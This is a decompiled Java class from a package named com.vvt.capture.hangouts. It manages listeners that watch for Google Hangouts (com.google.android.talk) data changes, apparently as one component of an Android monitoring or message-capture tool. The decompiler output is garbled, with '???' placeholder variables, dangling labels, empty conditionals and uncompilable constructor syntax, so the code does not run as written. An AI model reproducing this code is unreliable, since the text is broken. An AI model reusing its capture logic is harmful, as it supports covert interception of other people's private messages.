package com.vvt.capture.hangouts.c;

import com.vvt.base.capture.i;
import java.util.HashSet;
import java.util.Iterator;

public class a
  implements com.vvt.n.a.a
{
  private static final boolean a = com.vvt.ak.a.e;
  private static final boolean b = com.vvt.ak.a.a;
  private static a d;
  private com.vvt.n.a.b c;
  private boolean e = false;
  private HashSet f;
  
  private a()
  {
    HashSet localHashSet = new java/util/HashSet;
    localHashSet.<init>();
    this.f = localHashSet;
  }
  
  public static a a()
  {
    synchronized (a.class)
    {
      a locala = d;
      if (locala == null)
      {
        locala = new com/vvt/capture/hangouts/c/a;
        locala.<init>();
        d = locala;
      }
      locala = d;
      return locala;
    }
  }
  
  public void a(i parami)
  {
    int i = b;
    if (i != 0) {}
    synchronized (this.f)
    {
      Object localObject2 = this.f;
      i = ((HashSet)localObject2).contains(parami);
      if (i == 0)
      {
        localObject2 = this.f;
        ((HashSet)localObject2).add(parami);
      }
      i = this.e;
      if (i != 0) {
        break label136;
      }
      i = 1;
      this.e = i;
      localObject2 = this.c;
      if (localObject2 != null)
      {
        ??? = com.vvt.n.a.b.b.a();
        int k = ???.length;
        i = 0;
        localObject2 = null;
        if (i >= k) {
          break label136;
        }
        String str = ???[i];
        com.vvt.n.a.b localb = this.c;
        localb.c(str, this);
        int j;
        i += 1;
      }
    }
    boolean bool = a;
    if (bool) {}
    label136:
    bool = b;
    if (bool) {}
  }
  
  public void a(com.vvt.n.a.b paramb)
  {
    this.c = paramb;
  }
  
  public void a(String paramString)
  {
    boolean bool = b;
    if (bool) {}
    synchronized (this.f)
    {
      Object localObject1 = this.f;
      Iterator localIterator = ((HashSet)localObject1).iterator();
      bool = localIterator.hasNext();
      if (bool)
      {
        localObject1 = localIterator.next();
        localObject1 = (i)localObject1;
        ((i)localObject1).a();
      }
    }
    bool = b;
    if (bool) {}
  }
  
  public void b(i parami)
  {
    int i = 0;
    Object localObject1 = null;
    boolean bool2 = b;
    if (bool2) {}
    synchronized (this.f)
    {
      HashSet localHashSet = this.f;
      boolean bool4 = localHashSet.contains(parami);
      if (bool4)
      {
        localHashSet = this.f;
        localHashSet.remove(parami);
      }
      ??? = this.f;
      int j = ((HashSet)???).size();
      bool4 = b;
      if ((!bool4) || (j == 0))
      {
        boolean bool3 = this.e;
        if (bool3)
        {
          this.e = false;
          ??? = this.c;
          if (??? != null)
          {
            ??? = com.vvt.n.a.b.b.a();
            int k = ???.length;
            if (i < k)
            {
              String str = ???[i];
              com.vvt.n.a.b localb = this.c;
              localb.a(str);
              i += 1;
            }
          }
        }
      }
    }
    boolean bool1 = b;
    if (bool1) {}
  }
  
  public void c(String paramString)
  {
    boolean bool = b;
    if (bool) {}
    Object localObject = this.f;
    Iterator localIterator = ((HashSet)localObject).iterator();
    for (;;)
    {
      bool = localIterator.hasNext();
      if (!bool) {
        break;
      }
      localObject = (i)localIterator.next();
      String str = "com.google.android.talk";
      ((i)localObject).a(str, paramString);
    }
    bool = b;
    if (bool) {}
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/hangouts/MyUncaughtExceptionHandler/a.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */